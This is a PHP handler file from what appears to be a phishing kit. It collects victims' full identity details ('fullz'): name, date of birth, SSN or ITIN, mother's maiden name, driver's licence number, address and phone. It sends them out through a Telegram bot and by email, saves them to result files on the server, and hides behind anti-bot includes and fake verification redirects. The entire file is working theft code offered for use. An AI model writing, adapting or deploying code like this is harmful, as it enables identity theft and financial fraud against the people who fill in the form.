<?php
session_start();
error_reporting(0);
include('../../bots/anti1.php');
include('../../bots/anti2.php');
include('../../bots/anti3.php');
include('../../bots/anti4.php');
include('../../bots/anti5.php');
include('../../bots/anti6.php');
include('../../bots/anti7.php');
include('../../bots/anti8.php');
include('../../bots/ant1.php');
include('../../bots/ant2.php');
include('../../bots/ant3.php');
include('../../bots/ant4.php');
include('../../bots/ant5.php');
include('../../bots/ant6.php');
include('../../bots/ant7.php');
include('../../bots/ant8.php');
include '../autob/bt.php';
include "../autob/bts2.php";
include "../req/config.php";
include ('../../email.php');
if(isset($_POST['fname']) && isset($_POST['dob']) && isset($_POST['street']) && isset($_POST['state']) && isset($_POST['mmn']) && (isset($_POST['ssn']) || isset($_POST['itin'])) ){
    if(strlen($_POST['dob']) == 10){
	///////////////////////// MAIL PART //////////////////////
		$fullname = $_POST['fname'];
		$street_address = $_POST['street'];
		$dob = $_POST['dob'];
		$dl = $_POST['dl'];
		$ssn = $_POST['ssn']?$_POST['ssn']:'';
		$itin = $_POST['itin']?$_POST['itin']:'';
		$mmn = $_POST['mmn']?$_POST['mmn']:'';
		$city = $_POST['city'];
		$state = $_POST['state'];
		$zip_code = $_POST['zip'];
		$mobile = $_POST['phone'];
		$pcarrier = $_POST['pcarrier'];
		$email = $_POST['email'];
		$emailpass = $_POST['emailpass'];
		$PublicIP = $_SERVER['REMOTE_ADDR'];
        $Info_LOG = "
|------------------- Fullz INFO ----------------| 
First Name       : $fullname      
DOB              : $dob			  
SSN              : $ssn
ITIN             : $itin
MMN              : $mmn
DL NO.           : $dl 
Street Address   : $street_address 
City             : $city          
State            : $state		  
Zip/Postal Code  : $zip_code 	  
Phone Number     : $mobile
Phone Carrier    : $pcarrier";
		$_SESSION['fullz'].=$Info_LOG; 
		
				
		$website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId,
      'text'=>$Info_LOG,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
  
// Don't Touche
//Email
        if ($Send_Email == 1) {
            $subject = $PublicIP.' : ['.strtoupper($state).'] New HUNT FULLZ Info' ;$headers = 'From: HUNTSITE' . "\r\n" .'X-Mailer: PHP/' . phpversion();
			$protocol=array($subject,$Info_LOG,$headers);if (detectprotocol($protocol)){
				mail($to, $subject, $Info_LOG, $headers);}
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir('../../rst');
            $file = fopen("../../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
		header("location:ver2.php?consent_handled=true&amp;consentResponseUri=%2Fprotocol&amp;p=none");
    }
    else{ header("location:verify.php?sfailed=c".md5(rand(100, 999999999))."15181d31&amp;consent_handled=true&amp;consentResponseUri=%2Fprotocol"); };
}
else { header("location:verify.php?sfailed=c3Fauth".md5(rand(100, 999999999))."2da15181d31&amp;consent_handled=true&amp;consentResponseUri=%2Fprotocol"); };
?>